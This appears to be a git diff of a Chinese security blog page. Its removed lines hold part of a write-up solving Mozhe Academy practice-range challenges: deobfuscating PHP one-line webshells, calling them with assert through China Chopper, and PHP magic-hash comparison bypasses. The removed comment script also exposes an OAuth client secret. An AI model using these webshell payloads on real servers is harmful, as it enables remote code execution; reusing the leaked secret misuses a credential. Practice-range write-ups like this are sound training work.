-<p>替换<code>${$__}[!$_](${$___}[$_]);</code>得到<code>${_GET}[!1](${_POST}[1]);</code>,去掉多余的{}，[!1]==[0],整理一下变成<code>$_GET[0]($_POST[1]);</code><br>和一句话马的<code>$_POST[1]</code>传参差不多，<code>$_GET[0]</code>就是我们的函数名。<br>使用 <code>http://219.153.49.228:44530/b.php?0=eval</code> 然后用菜刀连接出错，通过一番百度知道了<code>eval</code>和<code>assert</code>的<a href="https://www.cnblogs.com/iamstudy/articles/analysis_eval_and_assert.html" target="_blank" rel="noopener">区别</a>，改成assert执行，成功拿到key</p>
-<h6 id="eval和assert的区别"><a href="#eval和assert的区别" class="headerlink" title="eval和assert的区别"></a>eval和assert的区别</h6><p>简单来说，<code>eval();</code>中的参数是字符，如:<code>eval(&#39;echo 1;&#39;)</code>;，<code>assert()</code>中的参数为表达式(或者函数),如:<code>assert(phpinfo())</code>,<code>eval</code>其实是<code>Zend</code>函数,<code>assert</code>是<code>PHP_FUNCTION宏</code>编写的。</p>
-<h3 id="PHP代码分析溯源-第2题"><a href="#PHP代码分析溯源-第2题" class="headerlink" title="PHP代码分析溯源(第2题)"></a>PHP代码分析溯源(第2题)</h3><p>由于PHP是弱类型语言，在使用<code>==</code>号时，如果比较一个数字和字符串或者涉及到数字内容的字符串，则字符串会被转换为数值并且比较按照数值来进行。此规则也适用于<code>switch</code>语句。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5(&apos;240610708&apos;) 的结果是：0e462097431906509019562988736854</span><br><span class="line">md5(&apos;QNKCDZO&apos;) 的结果是：0e830400451993494058024219903391</span><br></pre></td></tr></table></figure></p>
-<p>刚好两个字符串都是以<code>0e</code>的科学计数法，字符串被隐私转换为浮点数，实际上等效为<code>0x10^0</code>,同理还有:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>));</span><br><span class="line">var_dump(sha1(<span class="string">'aaroZmOk'</span>) == sha1(<span class="string">'aaK1STfY'</span>));</span><br><span class="line">var_dump(<span class="string">'0x1234Ab'</span> == <span class="string">'1193131'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>所以<code>md5值</code>只要开头两个字符是<code>0e</code>的都可以,在输入框输入<code>240610708</code>，就可以拿到key</p>
-<h3 id="SQL手工注入漏洞测试-MySQL数据库"><a href="#SQL手工注入漏洞测试-MySQL数据库" class="headerlink" title="SQL手工注入漏洞测试(MySQL数据库)"></a>SQL手工注入漏洞测试(MySQL数据库)</h3><h3 id="WebShell代码分析溯源-第1题"><a href="#WebShell代码分析溯源-第1题" class="headerlink" title="WebShell代码分析溯源(第1题)"></a>WebShell代码分析溯源(第1题)</h3><p>下载源码，打开查看，可以搜索<code>$_POST[</code>，在<code>cn-right.php</code>中，找到<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$_GET[<span class="string">'POST'</span>]($_POST[<span class="string">'GET'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>典型变形一句话木马，需要构造为<code>&lt;?php assert($_POST[&#39;pass&#39;]);?&gt;</code>,则get传入<code>POST=assert</code>，POST传入密码<code>GET</code>，菜刀连接<code>http://219.153.49.228:47711/www/cn-right.php?POST=assert</code>，密码<code>GET</code>，拿到key</p>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢鼓励！｡◕ᴗ◕｡<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/assets/img/alipay.jpg">
-                      <span class="reward-type">支付宝</span>
-                    </div>
-                    
-                    
-                    <div class="reward-box-item">
-                      <img class="reward-img" src="/assets/img/weixin.png">
-                      <span class="reward-type">微信</span>
-                    </div>
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">write up</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">恶意软件分析</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">注入</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">编程</a>
         		</li>
       		 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">脚本</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">墨者学院</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">在线靶场</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">burpsuite</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">web安全</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">代码审计</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">取证分析</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">webshell</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">上传漏洞</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">绕过</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">木马</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">教程</a>
         		</li>
       		
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/08/16/墨者学院在线靶场writeup/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
-  
-    <a href="/2018/08/22/常见一句话木马大全/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          常见一句话木马大全
-        
-      </div>
-    </a>
   
   
-    <a href="/2018/08/10/Git使用笔记/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Git使用笔记</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-        <div class="toc-container tooltip-left">
-            <i class="icon-font icon-category"></i>
-            <div class="tooltip tooltip-east">
-                <span class="tooltip-item">
-                </span>
-                <span class="tooltip-content">
-                    <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#入门"><span class="toc-number">1.</span> <span class="toc-text">入门</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WEB页面源代码查看"><span class="toc-number">1.0.1.</span> <span class="toc-text">WEB页面源代码查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#服务器返回数据查看"><span class="toc-number">1.0.2.</span> <span class="toc-text">服务器返回数据查看</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#浏览器信息伪造"><span class="toc-number">1.0.3.</span> <span class="toc-text">浏览器信息伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#登录密码重置漏洞分析溯源"><span class="toc-number">1.0.4.</span> <span class="toc-text">登录密码重置漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#热点评论刷分漏洞分析溯源"><span class="toc-number">1.0.5.</span> <span class="toc-text">热点评论刷分漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#投票常见漏洞分析溯源"><span class="toc-number">1.0.6.</span> <span class="toc-text">投票常见漏洞分析溯源</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#来源页伪造"><span class="toc-number">1.0.7.</span> <span class="toc-text">来源页伪造</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP动作练习"><span class="toc-number">1.0.8.</span> <span class="toc-text">HTTP动作练习</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址伪造-第1题"><span class="toc-number">1.0.9.</span> <span class="toc-text">IP地址伪造(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IP地址伪造-第2题"><span class="toc-number">1.0.10.</span> <span class="toc-text">IP地址伪造(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第1题"><span class="toc-number">1.0.11.</span> <span class="toc-text">远程电子数据取证-服务器分析(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第2题"><span class="toc-number">1.0.12.</span> <span class="toc-text">远程电子数据取证-服务器分析(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第3题"><span class="toc-number">1.0.13.</span> <span class="toc-text">远程电子数据取证-服务器分析(第3题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第4题"><span class="toc-number">1.0.14.</span> <span class="toc-text">远程电子数据取证-服务器分析(第4题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第5题"><span class="toc-number">1.0.15.</span> <span class="toc-text">远程电子数据取证-服务器分析(第5题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第6题"><span class="toc-number">1.0.16.</span> <span class="toc-text">远程电子数据取证-服务器分析(第6题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-服务器分析-第7题"><span class="toc-number">1.0.17.</span> <span class="toc-text">远程电子数据取证-服务器分析(第7题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第1题"><span class="toc-number">1.0.18.</span> <span class="toc-text">远程电子数据取证-木马分析(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第2题"><span class="toc-number">1.0.19.</span> <span class="toc-text">远程电子数据取证-木马分析(第2题)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#利用保留字隐藏"><span class="toc-number">1.0.19.0.0.1.</span> <span class="toc-text">利用保留字隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用clsid隐藏"><span class="toc-number">1.0.19.0.0.2.</span> <span class="toc-text">利用clsid隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用注册表隐藏"><span class="toc-number">1.0.19.0.0.3.</span> <span class="toc-text">利用注册表隐藏</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#利用畸形目录"><span class="toc-number">1.0.19.0.0.4.</span> <span class="toc-text">利用畸形目录</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第3题"><span class="toc-number">1.0.20.</span> <span class="toc-text">远程电子数据取证-木马分析(第3题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#远程电子数据取证-木马分析-第4题"><span class="toc-number">1.0.21.</span> <span class="toc-text">远程电子数据取证-木马分析(第4题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#内部文件上传系统漏洞分析溯源"><span class="toc-number">1.0.22.</span> <span class="toc-text">内部文件上传系统漏洞分析溯源</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#IIS6-0解析漏洞利用方法"><span class="toc-number">1.0.22.0.0.1.</span> <span class="toc-text">IIS6.0解析漏洞利用方法:</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell文件上传漏洞分析溯源-第1题"><span class="toc-number">1.0.23.</span> <span class="toc-text">WebShell文件上传漏洞分析溯源(第1题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell文件上传漏洞分析溯源-第2题"><span class="toc-number">1.0.24.</span> <span class="toc-text">WebShell文件上传漏洞分析溯源(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP代码分析溯源-第1题"><span class="toc-number">1.0.25.</span> <span class="toc-text">PHP代码分析溯源(第1题)</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#eval和assert的区别"><span class="toc-number">1.0.25.0.0.1.</span> <span class="toc-text">eval和assert的区别</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP代码分析溯源-第2题"><span class="toc-number">1.0.26.</span> <span class="toc-text">PHP代码分析溯源(第2题)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL手工注入漏洞测试-MySQL数据库"><span class="toc-number">1.0.27.</span> <span class="toc-text">SQL手工注入漏洞测试(MySQL数据库)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell代码分析溯源-第1题"><span class="toc-number">1.0.28.</span> <span class="toc-text">WebShell代码分析溯源(第1题)</span></a></li></ol></li></ol></li></ol>
-                    </div>
-                </span>
-            </div>
-        </div>
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
-  <div id="gitment-ctn"></div> 
-<link rel="stylesheet" href="//imsun.github.io/gitment/style/default.css">
-<script src="//imsun.github.io/gitment/dist/gitment.browser.js"></script>
-<script>
-var gitment = new Gitment({
-  id: "http://yoursite.com/2018/08/16/墨者学院在线靶场writeup/",
-  owner: 'yehongning',
-  repo: 'yehongning.github.io',
-  oauth: {
-    client_id: '49ddd2ad51d791ace91c',
-    client_secret: '0b400e3b9dd89b72272e47c7b15fd2a8b031d05c',
-  },
-})
-gitment.render('gitment-ctn')
-</script>
-  
+    
 
 
           </div>
@@ -506,9 +261,9 @@ gitment.render('gitment-ctn')
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: true,
 		toc_hide_index: true,
